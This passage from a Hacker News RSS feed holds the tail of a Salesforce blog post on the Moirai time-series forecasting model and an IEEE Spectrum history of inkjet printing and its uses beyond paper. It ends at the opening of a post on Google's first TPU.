standard practice for deep forecasting models.&nbsp;</p><p>In our pre-training task, we formulate the objective to optimize the mixture distribution log-likelihood. The design of both the data distribution and task distribution are two critical aspects of the pre-training pipeline. This design imparts versatile capabilities to our Large Time Series Model (LTM), enabling it to adapt to a range of downstream tasks. This flexibility stands in contrast to the prevailing deep forecasting paradigm, where models are typically specialized for specific datasets and settings.</p><h3 id="results"><strong>Results</strong></h3><p>We train Moirai in 3 sizes – small/base/large with 14m/91m/311m parameters! On in-distribution evaluations using the Monash Time Series Forecasting Benchmark, Moirai displays phenomenal performance, beating all baselines.&nbsp;</p><figure><img src="https://lh7-us.googleusercontent.com/hhBUPDh3d2PobIIj4fndgzk_buqAwD48Uu3dlv7i3Xms2S7gjx56tkcXUAo-1WGWn6gx4waygnH2tg6NKAVaygWRJOV7R-lpvO0VKrC5FeH09cWCq-L8cxzfZprrzuSeUbtIH49yVh6kXhXbnmBHYTQ" alt="" loading="lazy" width="878" height="494"></figure><p>In out-of-distribution/zero-shot forecasting evaluations, Moirai consistently demonstrates competitive performance, and in some instances, surpasses state-of-the-art full-shot models. This superiority is observed across probabilistic forecasting and long-sequence forecasting benchmarks.</p><figure><img src="https://lh7-us.googleusercontent.com/7eEE0QBlp8uxq5gMoYW7m3l-2-dIotL5_YvH7s-_m6KjU4cOa5x82bSr_aX8UjbHmjJ6GLfNVa3sj1cwu9Y0JEthXedFZXdUUXij7mOZQhaVF7OuE_en9t6HtjXlnaE1WhKeeVRJRO9T-SrhLray7k0" alt="" loading="lazy" width="1600" height="513"></figure><figure><img src="https://lh7-us.googleusercontent.com/J4TVppnqY5bCrN15eV7XdMaCc7tMDDH6Dj9u-sd_IiEyQIjyZRksFn1gzemjOxpQg03BN6nwcOtCKxJ3EeL8flA4lfvAWBbbkKLsxf-tpEhFEPkB9O8x1DBHkxBUvVNw2rzArvxiVtKOqo7SGAORQxY" alt="" loading="lazy" width="1600" height="495"></figure><p>Here are some visualizations of zero-shot forecasts from Moirai on the popular datasets. As depicted, Moirai adeptly crafts forecasts marked by discernible seasonal patterns from ETTh1-1 and ETTh1-2, while also accurately capturing trend patterns from ETTm1-1 and ETTm1-2. These illustrations underscore Moirai's capability to deliver insightful predictions across varied scenarios.</p><figure><img src="https://lh7-us.googleusercontent.com/PQR1m2ZjXBnu2N_PI6lKduLFCCvMV_QrXrmVqdITlRgyo2eXSS70qbmFS-8pr4MXSQBgXNo_KCiq5qkUt32mjWUkntjb98RKevDo-2tp_wlwPudmIv39HZMdMq6vw34v149n8DImSNytM28cxmkQoec" alt="" loading="lazy" width="1002" height="1028"></figure><h3 id="impact-why-moirai-matters"><strong>Impact: Why Moirai Matters</strong></h3><p>Moirai provides robust zero-shot forecasting capabilities across a diverse range of time series spanning different domains and frequencies. By harnessing the power of large-scale data pretraining, this time-series foundation model revolutionizes the landscape, departing from the outdated one-model-per-dataset approach. It offers substantial advantages to users in downstream forecasting tasks, eliminating the need for additional data, extensive computational resources, and expert input typically required for achieving accurate forecasts with deep learning models. Additionally, Moirai's ability to handle multivariate time series of any dimension further democratizes accurate forecasting by reducing reliance on both computational resources and deep learning expertise. In addition to being an important breakthrough for academia, Moirai has multiple applications including IT Operations, Sales Forecasting, Capacity Planning, Energy Forecasting and many others. </p><h3 id="the-bottom-line"><strong>The Bottom Line</strong></h3><ul><li>Moirai is designed to achieve universal forecasting with masked encoder-based time series transformers.</li><li>LOTSA is the largest collection of open data for pre-training time series forecasting models.</li><li>Moirai addresses key challenges of universal forecasting to support various domains, multiple frequencies, and any-variate in a zero-shot manner.</li><li>Evaluated in both in-distribution and out-of-distribution settings, Moirai shines as a zero-shot forecaster, delivering competitive or even superior performance compared to full-shot models.</li></ul><h3 id="explore-more"><strong>Explore More</strong></h3><p>Salesforce AI invites you to dive deeper into the concepts discussed in this blog post (see links below). Connect with us on social media and our website to get regular updates on this and other research projects.</p><ul><li><em>Learn more: </em>Check out our research paper (<a href="https://arxiv.org/abs/2402.02592?ref=blog.salesforceairesearch.com"><u>https://arxiv.org/abs/2402.02592</u></a>), which describes our work in greater detail.</li><li><em>Code: </em>Check out our code on GitHub:<a href="https://github.com/salesforce/PyRCA?ref=blog.salesforceairesearch.com"><em><u> </u></em></a><a href="https://github.com/SalesforceAIResearch/uni2ts?ref=blog.salesforceairesearch.com"><u>https://github.com/SalesforceAIResearch/uni2ts</u></a></li><li><em>Dataset</em>: Check out LOTSA data on Hugging Face: <a href="https://huggingface.co/datasets/Salesforce/lotsa_data?ref=blog.salesforceairesearch.com"><u>https://huggingface.co/datasets/Salesforce/lotsa_data</u></a>&nbsp;</li><li><em>Contact us: </em><a href="mailto:gwoo@salesforce.com"><em><u>&nbsp;gwoo@salesforce.com</u></em></a> <a href="mailto:chenghao.liu@salesforce.com"><u>chenghao.liu@salesforce.com</u></a></li><li><em>Follow us on Twitter: </em><a href="https://twitter.com/sfresearch?ref=blog.salesforceairesearch.com"><u>@SalesforceResearch</u></a>, <a href="https://twitter.com/salesforce?ref=blog.salesforceairesearch.com"><u>@Salesforce</u></a></li><li><em>Blog: </em>To read other blog posts, please see <a href="https://blog.salesforceairesearch.com/"><u>blog.salesforceairesearch.com</u></a></li><li><em>Main site: </em>To learn more about all of the exciting projects at Salesforce AI Research, please visit our main website at <a href="https://www.salesforceairesearch.com/?ref=blog.salesforceairesearch.com"><u>salesforceairesearch.com</u></a>.</li></ul><h3 id="about-the-authors"><strong>About the Authors</strong></h3><p><strong>Gerald Woo </strong>is a Ph.D. candidate in the Industrial PhD Program at Singapore Management University and a researcher at Salesforce AI Research Asia and his research focuses on deep learning for time-series, including representation learning, and forecasting.</p><p><strong>Chenghao Liu</strong> is a Lead Applied Scientist at Salesforce AI Research Asia, working on AIOps research, including time series forecasting, anomaly detection, and causal machine learning.</p><p><strong>Doyen Sahoo </strong>is the Director, of Salesforce AI Research Asia. Doyen leads several projects pertaining to AI for IT Operations or AIOps, AI for Software, and Time-Series intelligence -&nbsp; working on both fundamental and applied research.</p><p><strong>Caiming Xiong </strong>holds the positions of Managing Director and Vice President at Salesforce AI Research. He oversees the development and application of technologies such as Large Language Models (LLM), Multimodal LLMs, Large Action Models, AI for software, Time Series, and other foundational research areas. Additionally, Caiming directs the transition of these AI projects from research phases into production environments.</p>
        </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Inkjets are for more than just printing (150 pts)]]></title>
            <link>https://spectrum.ieee.org/inkjet-printer</link>
            <guid>39822222</guid>
            <pubDate>Mon, 25 Mar 2024 23:00:40 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://spectrum.ieee.org/inkjet-printer">https://spectrum.ieee.org/inkjet-printer</a>, See on <a href="https://news.ycombinator.com/item?id=39822222">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-headline="Inkjets Are for More Than Just Printing" data-elid="2667578405" data-post-url="https://spectrum.ieee.org/inkjet-printer" data-authors="Phillip W. Barth, Leslie A. Field" data-page-title="A Brief History of Inkjet Printers - IEEE Spectrum"><p><strong>In the early 1980s,</strong> offices were noisy places, filled with the sound of metal striking inked ribbons to mark characters on paper. IBM Selectric typewriters clacked, daisy wheel printers clattered, and dot-matrix printers made loud ripping sounds.
</p><p>
	Today, those noises are gone. And though we do spend more time reading on screens, we haven’t stopped printing on paper.
</p><p>
	The main reason for the quiet? The inkjet printer. While laser printers do the big printing jobs in commercial settings, the inkjet printer has become 
	<em>the</em> printer most of us use at home and at the office.
</p><p>
	The printhead of an inkjet printer performs a remarkable task. Even at the coarse resolution of 96 dots per inch (dpi), as was typical for the first models in the 1980s, the distance from dot center to dot center is a mere 260 micrometers. To fill a standard letter page that has 2.5-centimeter margins would require more than half a million individual ink droplets. Delivery of those tiny droplets involves moving them with very precise control, repeated a vast number of times as rapidly as possible. This process is ideally suited for <a href="https://en.wikipedia.org/wiki/MEMS" target="_blank">microelectromechanical systems (MEMS)</a>, which are electronic devices with microscopic components that employ movement.
</p><p>If there is a way to package something in microscopic droplets with the appropriate fluid properties, chances are someone is looking to adapt inkjet technology to work with it.</p><p>
	As with all microtechnology, the specs of inkjet systems have evolved considerably over time. A typical inkjet printhead in the mid-1980s had 12 nozzles working in parallel, each one emitting up to 1,350 droplets per second, to print 150 alphanumeric characters per second. Today, a high-end inkjet printhead used in a commercial printing press may contain 21,000 nozzles, each nozzle printing 20,000 to 150,000 dots per second. Each drop of ink may be just 1.5 picoliters—a picoliter is one-trillionth of a liter—and measure roughly 14 micrometers in diameter.
</p><p>
	Surpassing the visions of its creators, the inkjet technology used in these printers has found a host of applications beyond putting dots on paper. These include making DNA microarrays for genomics, creating electrical traces for printed circuit boards, and building 3D-printed structures. Future uses could include personalized medicine and development of advanced batteries.
</p><p>
	Indeed, a search for patents containing the word “inkjet” today returns more than 92,000 results. If there is a way to package something in microscopic droplets with the appropriate fluid properties, chances are someone is looking to adapt inkjet technology to work with it.
</p><h2>How MEMS Transformed Inkjet Printing</h2><p><a href="https://library.imaging.org/admin/apis/public/api/ist/website/downloadArticle/jist/42/1/art00007" target="_blank">Inkjet technology</a> dates back to 1948, when Swedish inventor 
	<a href="https://en.wikipedia.org/wiki/Rune_Elmqvist" rel="noopener noreferrer" target="_blank">Rune Elmqvist</a>&nbsp;<a href="https://patents.google.com/patent/US2566443A/en" rel="noopener noreferrer" target="_blank">patented</a> a chart recorder wherein a very thin glass tube emitting a continuous jet of ink was steered to make a trace on a moving strip of paper. A couple of years later, <a href="https://ecglibrary.com/ecghist.html" rel="noopener noreferrer" target="_blank">he demonstrated</a> his invention in the form of <a href="https://carl-kulturen-com.translate.goog/medi/web/object/45610?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en-US&amp;_x_tr_pto=wapp" target="_blank">a device</a> for recording electrocardiograms.
</p><p>
	In 1965, Richard G. Sweet of Stanford University 
	<a href="https://doi.org/10.1063/1.1719502" rel="noopener noreferrer" target="_blank">developed a chart recorder</a> in which the jet of ink was broken into a uniform stream of electrically charged droplets. Diverter electrodes on either side of the stream could permit the drops to proceed straight to the paper, or else deflect them onto an absorbent pad or into a gutter to be collected and reused.
</p><p data-rm-resized-container="25%"><img id="9814e" data-rm-shortcode-id="763d906565f62f9acecbb6e4e63025c4" data-rm-shortcode-name="rebelmouse-image" lazy-loadable="true" src="https://spectrum.ieee.org/media-library/image.jpg?id=51827695&amp;width=980" data-runner-src="https://spectrum.ieee.org/media-library/image.jpg?id=51827695&amp;width=980" width="1500" height="1000" alt=""></p><p data-rm-resized-container="25%"><img id="2e147" data-rm-shortcode-id="25911d80203ffb9022a126731f939fb6" data-rm-shortcode-name="rebelmouse-image" lazy-loadable="true" src="https://spectrum.ieee.org/media-library/photos-of-hp-thinkjet-printer-ink-cartridge-and-hp-jet-fusion-5200-3d-printer.jpg?id=51827691&amp;width=980" data-runner-src="https://spectrum.ieee.org/media-library/photos-of-hp-thinkjet-printer-ink-cartridge-and-hp-jet-fusion-5200-3d-printer.jpg?id=51827691&amp;width=980" width="1500" height="1000" alt="Photos of HP Thinkjet printer, ink cartridge, and HP Jet Fusion 5200 3D printer."><small placeholder="Add Photo Caption...">In April 1984, the HP ThinkJet [top] ushered in the era of desktop inkjet printing. The Thinkjet’s ink cartridge [bottom] delivered thousands of microscopic droplets a second from 12 nozzles. The MEMS technology to perform that feat was entirely within the printhead.</small><small placeholder="Add Photo Credit...">HP</small></p><p>
	This technology is called continuous inkjet printing, and by 1976 IBM had incorporated it in a commercial printer, the 
	<a href="https://en.wikipedia.org/wiki/IBM_6640" rel="noopener noreferrer" target="_blank">IBM 6640</a>. But continuous inkjets lose ink to evaporation even when recycling is used, limiting their appeal.
</p><p>
	To get around the wastefulness of continuous inkjets, others worked on developing drop-on-demand inkjet printers, where each orifice on the printhead emits one drop of ink at a time, avoiding the waste of a continual flow of drops. Surface tension holds the ink in place in a tiny open nozzle until a mechanism pushes the ink to eject a drop. Each drop hitting the paper creates a dot, and moving the printhead back and forth builds up an image. A printhead with multiple orifices can emit many drops of ink simultaneously, so each pass of the printhead across the page adds a strip of the image, not just a single drop-thin line.
</p><p>
	In the late 1970s, Siemens was the first to sell a drop-on-demand inkjet printer. It came not as a stand-alone device like a modern desktop printer, but as an integral part of a computer terminal, the 
	<a href="https://de.wikipedia.org/wiki/Siemens_PT80i" rel="noopener noreferrer" target="_blank">Siemens PT80i</a> (Printer Terminal 80 Inkjet). The printer used piezoelectric actuators surrounding 12 ink tubes, which fed 12 nozzles to shoot ink droplets, printing 270 characters per second.
</p><p><a href="https://en.wikipedia.org/wiki/Piezoelectricity" rel="noopener noreferrer" target="_blank">Piezoelectric</a> devices rely on how some materials, such as ceramic lead-zirconate-titanate (PZT), change shape when subjected to a voltage. This effect has proved extremely useful in MEMS in general, for generating precise forces and motion on command. If a layer of PZT is bonded to a nonpiezoelectric material, forming what’s called a bimorph, it will bend when exposed to a voltage. In the piezoelectric inkjet nozzle, the bending of the bimorph pushes ink out of the orifice. [For another application of piezoelectric MEMS technology, see “<a href="https://spectrum.ieee.org/mems-ultrasound-history" target="_blank">How Ultrasound Became Ultra Small</a>.”]
</p><p data-rm-resized-container="25%"><img id="6b341" data-rm-shortcode-id="9dc5754ed36bf2b592d6a19609da2eb1" data-rm-shortcode-name="rebelmouse-image" lazy-loadable="true" src="https://spectrum.ieee.org/media-library/photo-of-hp-jet-fusion-5200-3d-printer.jpg?id=51828514&amp;width=980" data-runner-src="https://spectrum.ieee.org/media-library/photo-of-hp-jet-fusion-5200-3d-printer.jpg?id=51828514&amp;width=980" width="1500" height="1000" alt="Photo of HP Jet Fusion 5200 3D printer"><small placeholder="Add Photo Caption...">The HP Jet Fusion 5200 industrial 3D printer uses an inkjet process to build parts out of nylon, polypropylene, or polyurethane.</small><small placeholder="Add Photo Credit...">HP</small></p><p>
	This novel printing technology, however, was not yet as dependable as proven impact printers in the 1970s, and the whole Siemens terminal became unusable if the printer failed, so it didn’t catch on.
</p><p>
	Meanwhile, researchers at both Hewlett-Packard and Canon noticed that ink would boil and splatter when exposed to a hot element like a soldering iron, and they decided to turn that splattering into a useful inkjet printing mechanism. They knew that a resistor could be used as a heating element and could be miniaturized with the same technology as that used for integrated circuits. In the printers they built, each ink nozzle contains a resistor instead of a piezoelectric actuator. An electrical pulse heats the resistor, which flash-boils a thin layer of the ink, forming a rapidly expanding vapor bubble that pushes a droplet of ink out through the orifice.
</p><p>
	This work led to two <a href="https://www.hp.com/hpinfo/abouthp/histnfacts/museum/imagingprinting/0011/index.html" target="_blank">competing</a>&nbsp;<a href="https://global.canon/en/news/2015/aug26e2.html" target="_blank">versions</a> of thermal inkjet technology coming to market at nearly the same time 40 years ago. (The same year, 1984, Epson introduced a stand-alone 
	<a href="https://corporate.epson/en/about/history/milestone-products/1984-10-sq2000.html" rel="noopener noreferrer" target="_blank">piezoelectric inkjet printer</a>.)
</p><p>
	Hewlett-Packard’s 
	<a href="https://www.hp.com/hpinfo/abouthp/histnfacts/museum/imagingprinting/0011/index.html" rel="noopener noreferrer" target="_blank">HP ThinkJet</a> was its first desktop inkjet printer based on its thermal technology, and it was designed to connect to a personal computer for everyday printing. It had an immediate advantage over the recently developed laser printers: It was much cheaper. A desktop laser printer from HP cost US $3,500 (about $10,500 today); HP’s 2225A ThinkJet cost only $495 ($1,500 today). Inkjet printers also used far less power than laser printers did and were quieter. Admittedly, inkjets didn’t have great resolution—96 dpi compared with 300 for laser printers in those early days—and they were slow.
</p><p>
	But the advantages outweighed the disadvantages (more so as the technology improved), and inkjet printers came to dominate the desktop and home printer markets. Today, more than 20 companies make inkjet printers, generating a market of 
	<a href="https://www.researchandmarkets.com/report/inkjet-printing" rel="noopener noreferrer" target="_blank">more than $100 billion</a> annually and continuing to grow at more than 8 percent per year.
</p><h2>Printing DNA Microarrays With Inkjets</h2><p>
	While the business of making inkjet printers matured and grew, some companies began exploring what other kinds of “ink” might be delivered with an inkjet. One of these was Agilent Technologies, a spin-off of Hewlett Packard with a focus on life-science and chemical-analysis technologies. Agilent developed a way to print strands of DNA from the four nucleic acid bases—cytosine (C), guanine (G), adenine (A), and thymine (T). Specifically, the company adapted existing DNA chemistries plus inkjet printing techniques to build 
	<a href="https://www.agilent.com/library/applications/5989-9159en_lo.pdf" rel="noopener noreferrer" target="_blank">microarrays of DNA</a> on glass slides for <a href="https://journals.asm.org/doi/10.1128/cmr.00019-09" rel="noopener noreferrer" target="_blank">genomics work</a>, such as measuring which genes are being expressed in an organism under various conditions. Academic researchers have shared open-source methods for <a href="https://genomebiology.biomedcentral.com/articles/10.1186/gb-2004-5-8-r58" rel="noopener noreferrer" target="_blank">converting existing inkjet printers</a> to build their own microarrays, albeit with specs that are much more modest than the commercial systems.
</p><p>
	A DNA microarray consists of a substrate, usually glass, with an array of small regions called spots where DNA strands are attached. Agilent produces arrays with as many as a million spots on a single 2.5-by-7.6-cm slide. An open-source system puts up to 10,000 in a somewhat smaller area. Each DNA strand is made of sequences of the bases C, G, A, and T. In double-stranded DNA, the strands have complementary sequences, which join up like rungs of a ladder, C joining with G, and A with T.
</p><p>
	A DNA microarray uses single-stranded DNA, and each spot has millions of strands with a common sequence. When a sample with copies of the complementary strand washes over the spot, those strands bind together with the strands anchored in the spot. The sample strands are tagged with fluorescent molecules, and the user learns which DNA sequences were present in the sample by examining which spots light up.
</p><p>
	In Agilent’s method for fabricating a microarray, the printer makes multiple passes over the substrate, each pass adding one base to each strand in the spots, with intermediate steps to prepare for the next pass.
</p><p>
	Adding a base is actually a three-step process. Each of the growing strands in the microarray spots has a molecular “cap” at the end that prevents the indiscriminate addition of more bases. So the first step is to remove or deactivate those caps by washing a solution over the nascent microarray. The second step is analogous to printing a page: At each spot on the microarray, the inkjet adds a dot of liquid containing the next monomer molecule (modified versions of C, G, A, or T) to be added to the end of the strand. These monomers each include a new cap so that only one molecule gets added to each strand. Although the newly added monomers are now attached to the strands, the connection is not fully stable, and so the third step applies an oxidizer solution that modifies the bonds, fully integrating the new monomers into the DNA structure. Rinse and repeat.
</p><p>
	The versatility of the open-source inkjet construction allows researchers to rapidly build prototype arrays with whatever sequences they want to try out. A new array can be designed, synthesized, and used to analyze DNA in a single day. 
	<a href="https://genomebiology.biomedcentral.com/articles/10.1186/gb-2004-5-8-r58" rel="noopener noreferrer" target="_blank">One group</a> reported a cycle time of 10 to 20 minutes to attach each base with their system, or about 13 hours to produce a batch of arrays, each with about 10,000 spots containing 40-base strands. For comparison’s sake, Agilent’s commercial microarrays typically have strands up to 60 bases long.
</p><p>
	Agilent also uses its inkjet system to synthesize another genomic workhorse known as an 
	<a href="https://www.agilent.com/en/solutions/genomics-applications-solutions/ols" rel="noopener noreferrer" target="_blank">oligonucleotide library</a>. The process is the same as for making a microarray, but at the end all the strands are cleaved from the substrate, dried, and packaged together in a single tube for the customer. Agilent’s inkjet-printed libraries have strands up to about 230 bases long.
</p><h2>3D Printing Using Two Inkjet Inks</h2><p data-rm-resized-container="25%"><img id="af069" data-rm-shortcode-id="de7c5b7b70ea177c31bc03ec6bead9f9" data-rm-shortcode-name="rebelmouse-image" lazy-loadable="true" src="https://spectrum.ieee.org/media-library/image.jpg?id=51816255&amp;width=980" data-runner-src="https://spectrum.ieee.org/media-library/image.jpg?id=51816255&amp;width=980" width="1500" height="1695" alt=""></p><p data-rm-resized-container="25%"><img id="045e7" data-rm-shortcode-id="05f52304492d1a9437f387ef7bcf4ab6" data-rm-shortcode-name="rebelmouse-image" lazy-loadable="true" src="https://spectrum.ieee.org/media-library/photos-of-3d-printed-objects.png?id=51816253&amp;width=980" data-runner-src="https://spectrum.ieee.org/media-library/photos-of-3d-printed-objects.png?id=51816253&amp;width=980" width="1500" height="1128" alt="Photos of 3D printed objects"><small placeholder="Add Photo Caption...">Invent Medical—a Czech Republic startup partnered with HP—custom printed this helmet for correcting head-shape deformities [top]. An HP Jet Fusion 5200 printed this lipstick holder [bottom].</small><small placeholder="Add Photo Credit...">Top: Invent Medical/HP; bottom: YOO Makeup/HP</small></p><p>
	In addition to printing two-dimensional pages and building one-dimensional molecular strands, inkjet technology has for many years been used to produce three-dimensional objects. One approach is a variant of powder-bed 3D printing, in which objects are built up by fusing or binding layers of powder in the desired pattern. The inkjet printhead applies droplets of a liquid binding agent to each layer of powder in the regions that will form the finished 3D items.</p><p>The <a href="https://www.hp.com/us-en/printers/3d-printers/products/multi-jet-technology.html" rel="noopener noreferrer" target="_blank">HP Multi Jet Fusion (MJF)</a> line of 3D printers extends this approach by depositing two types of ink: One is a binding promoter and the other a detailing agent, which is applied at the edges of the pattern to prevent the promoter from bleeding into the surrounding powder. A printhead carrying a wide array of inkjet nozzles dispenses these inks, and the array is quickly followed by a lighting bar to heat the powder, fusing it in the regions where the binding promoter is present. A fresh layer of powder is then spread over the entire printing area in readiness for the next cycle of the process. At the end, compressed air and a vacuum hose remove the unfused powder to reveal the completed 3D objects. The HP MJF printers perform this in a volume of up to 38 by 28 by 38 cm.</p><p data-rm-resized-container="25%"><img id="49468" data-rm-shortcode-id="8807012fcdad4f97b39c08dc12e24c17" data-rm-shortcode-name="rebelmouse-image" lazy-loadable="true" src="https://spectrum.ieee.org/media-library/photo-of-a-3d-printed-vacuum.jpg?id=51828525&amp;width=980" data-runner-src="https://spectrum.ieee.org/media-library/photo-of-a-3d-printed-vacuum.jpg?id=51828525&amp;width=980" width="2000" height="1392" alt="Photo of a 3D printed vacuum."><small placeholder="Add Photo Caption...">This model of a handheld vacuum cleaner with colored, translucent, and transparent parts was printed in one piece on a Mimaki inkjet 3D printer.</small><small placeholder="Add Photo Credit...">Mimaki Engineering Co.</small></p><p>A quite different approach has been taken by 
	<a href="https://mimaki.com/" rel="noopener noreferrer" target="_blank">Mimaki Engineering Co.</a> of Japan, which has introduced <a href="https://www.mimakiusa.com/products/3d/3duj-553/" target="_blank">3D printers</a> with piezoelectric inkjet heads that dispense droplets of resin. The resins are photopolymers that are cured by ultraviolet light-emitting diodes after each layer is printed. Instead of using a powder bed that fills the entire build area, the printer deposits the resins on top of the growing structure. To deal with steep overhangs—such as an outstretched arm of a figurine—one of the resins produces a water-soluble material, which is used to build supports where needed. After the build is finished, these supports can be dissolved away.
</p><p>
	Seven other resins provide colors that can include CMYK—the familiar cyan, magenta, yellow, and black inks of consumer inkjet printers—as well as white and clear, for a total of 10 million color combinations, comparable to the color depth that the human eye can discriminate. The resulting parts can combine solid color, colored transparency and translucency, and colorless transparency.
</p><p>
	The printer provides a volume for building that measures 51 by 51 by 30 cm. Unlike with a powder-bed machine, small test parts can be made without filling the entire volume. In general, however, the Mimaki approach is slower than that of the HP MJF because it uses smaller printheads instead of a wide one that can cross the entire area in one sweep.
</p><h2>Inkjet’s Future</h2><p>
	Inkjet printing’s strength is the ability to pattern various inks over large areas in short, rapid production runs at a reasonable cost. It cannot generally compete with standard high-volume production approaches, because those will usually be cheaper. Thus, a car enthusiast, for instance, may embrace 3D inkjet printing to make bespoke parts for repairs or other tinkering, but a high-volume car-parts manufacturer is not going to introduce such printers to its factory lines. Similarly, a company may build individual figurines from a customer’s design, printed by 3D inkjet, but the same technique won’t be economical for mass-producing models of the latest superhero. With many potential applications, it isn’t clear if there is a niche where the inkjet approach will win.
</p><p>
	An example is the use of 3D inkjet printing for 
	<a href="https://www.researchgate.net/publication/348562139_3D_Printing_as_a_Promising_Tool_in_Personalized_Medicine" rel="noopener noreferrer" target="_blank">personalized medicine</a>. The idea is to produce tablets of a medication customized for a specific patient. Such personalized pills can include simple fine-tuning of the dose for an individual, as well as adjustments to the drug’s release rate—from very rapid to slow and sustained—through modifications to the binding agents and structure of the tablet. Rather than juggling multiple medications on a complicated schedule each day, a patient could take a single daily polypill—a 3D-printed tablet containing multiple medications, each with a different rate of release.
</p><p>
	Researchers are exploring how to adapt existing 3D printing techniques, including inkjet, to make these personalized medications. Inkjet systems are particularly suited for printing drugs in the form of thin films, such as transdermal patches to be applied to the skin and buccal films to be held in the cheek, where drugs can pass directly to the bloodstream without first going through the digestive system.
</p><p><img id="cb401" data-rm-shortcode-id="20c0c8188de16d7dbdd111b77709f19b" data-rm-shortcode-name="rebelmouse-image" lazy-loadable="true" src="https://spectrum.ieee.org/media-library/diagram-illustrating-use-of-inkjet-to-build-a-dna-microarray.png?id=51816847&amp;width=980" data-runner-src="https://spectrum.ieee.org/media-library/diagram-illustrating-use-of-inkjet-to-build-a-dna-microarray.png?id=51816847&amp;width=980" width="1500" height="728" alt="Diagram illustrating use of inkjet to build a DNA microarray."><small placeholder="Add Photo Caption...">A DNA microarray can be fabricated using an inkjet system to build custom-designed strands of DNA at each spot of the array. The printhead delivers a droplet of “ink” [left] containing modified monomers of one nucleotide [G, C, A, or T] to each spot. On the first print cycle, these monomers attach to the chemically treated glass surface. On subsequent print runs [right], a single monomer joins on the end of each growing DNA strand. Each monomer includes a protective cap to prevent other monomers from joining. Additional processes [not depicted here] wash away the nucleotide ink, apply a catalyst to complete the monomer bonding, and strip away the protective caps in preparation for the next printing step.</small><small placeholder="Add Photo Credit...">Chris Philpot</small></p><p>
	These printed personalized medicines, however, would be expensive compared to fixed doses rolling off standard high-volume production lines. Thus the technique is likely to be reserved for relatively rare conditions.
</p><p>
	Another potential application of 3D inkjet printing is in the <a href="https://doi.org/10.1016/j.heliyon.2022.e12623" target="_blank">fabrication of advanced lithium-ion batteries</a>. The charging and discharging of these batteries relies on lithium ions moving from the battery’s electrodes to its electrolyte and back again, in the process releasing or absorbing electrons that produce the current flow. The energy-storage density of the standard electrode design can be increased by using thicker electrodes, but this compromises the power density—the rate of energy release—because a smaller proportion of the electrode is in close contact with the electrolyte.
</p><p>
	A 3D inkjet could build electrodes with a detailed microstructure that allows the electrolyte to penetrate throughout the electrode volume. This could boost the ability of the active lithium ions and electrons to reach the entire electrode efficiently even when the electrode is larger, thereby increasing the energy storage and power density in tandem. For this vision to become a reality, however, researchers will need to learn more about how to formulate the “inks” for printing these electrodes: What are the best particle sizes and solvents to make an ink with fluid properties suitable for use in an inkjet system and that will produce stable printed structures with good electrochemical properties?
</p><p>
	We think it is unlikely, however, that inkjet printing could compete with high-volume manufacturing on price. Inkjet printing of prototypes, on the other hand, may uncover an optimal battery design that can then be adapted for production by conventional techniques.
</p><p>
	 Inkjet systems have been demonstrated for a wide variety of applications beyond what we have discussed above: 
	<a href="https://doi.org/10.1016/j.bprint.2021.e00157" rel="noopener noreferrer" target="_blank">Living cells can be printed</a>, for instance, to form tissue structures for in vitro experiments. MEMS such as <a href="https://ieeexplore.ieee.org/abstract/document/982863" rel="noopener noreferrer" target="_blank">microscopic motors</a> have been printed using inks containing nanoparticles of gold and silver as conductors and resin-based inks to act as insulators. <a href="https://doi.org/10.1038/s41598-020-59432-2" rel="noopener noreferrer" target="_blank">Flexible sensors</a> for health care monitoring have been printed using an electrically conducting polymer that responds to temperature differentials. And then there are all the ways inkjets are used to create images on media other than office printouts, such as printing of textiles, <a href="https://www.sae.org/site/news/2021/03/abb-inkjet-type-printers-enable-custom-automotive-paint-jobs" rel="noopener noreferrer" target="_blank">inkjet robots</a> to apply custom automotive paint jobs, and the “<a href="https://en.wikipedia.org/wiki/Gicl%C3%A9e" rel="noopener noreferrer" target="_blank">Giclée</a>” printing of fine art using archival-quality inks and substrates.
</p><p>
	Each of these applications is like a colored dot on the vast canvas of human technology and activity. And while the dots from inkjets, powered by MEMS, may be only a single color among many others on that metaphorical page, the picture would be very different without them. 
	<span></span></p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Google's First Tensor Processing Unit: Architecture (328 pts)]]></title>
            <link>https://thechipletter.substack.com/p/googles-first-tpu-architecture</link>
            <guid>39822184</guid>
            <pubDate>Mon, 25 Mar 2024 22:56:37 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://thechipletter.substack.com/p/googles-first-tpu-architecture">https://thechipletter.substack.com/p/googles-first-tpu-architecture</a>, See on <a href="https://news.ycombinator.com/item?id=39822184">Hacker News</a></p>
<div id="readability-page-1" class="page"><div dir="auto"><p>… we say tongue-in-cheek that TPU v1 “launched a thousand chips.”</p><p><span>In </span><a href="https://thechipletter.substack.com/p/googles-first-tensor-processing-unit" rel="">Google’s First Tensor Processing Unit - Origins</a><span>, we saw why and how Google developed the first Tensor Processing Unit (or TPU v1) in just 15 months, starting in late 2013. </span></p><div data-component-name="DigestPostEmbed"><a href="https://thechipletter.substack.com/p/googles-first-tensor-processing-unit" target="_blank" rel="noopener"></a><div><a href="https://thechipletter.substack.com/p/googles-first-tensor-processing-unit" target="_blank" rel="noopener"><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,h_212,c_fill,f_webp,q_auto:good,fl_progressive:steep,g_auto/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fede3c6cd-726f-4a26-995d-d2981d47a725_1600x923.png 424w, https://substackcdn.com/image/fetch/w_848,h_424,c_fill,f_webp,q_auto:good,fl_progressive:steep,g_auto/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fede3c6cd-726f-4a26-995d-d2981d47a725_1600x923.png 848w, https://substackcdn.com/image/fetch/w_1272,h_636,c_fill,f_webp,q_auto:good,fl_progressive:steep,g_auto/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fede3c6cd-726f-4a26-995d-d2981d47a725_1600x923.png 1272w, https://substackcdn.com/image/fetch/w_1300,h_650,c_fill,f_webp,q_auto:good,fl_progressive:steep,g_auto/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fede3c6cd-726f-4a26-995d-d2981d47a725_1600x923.png 1300w" sizes="100vw"><img 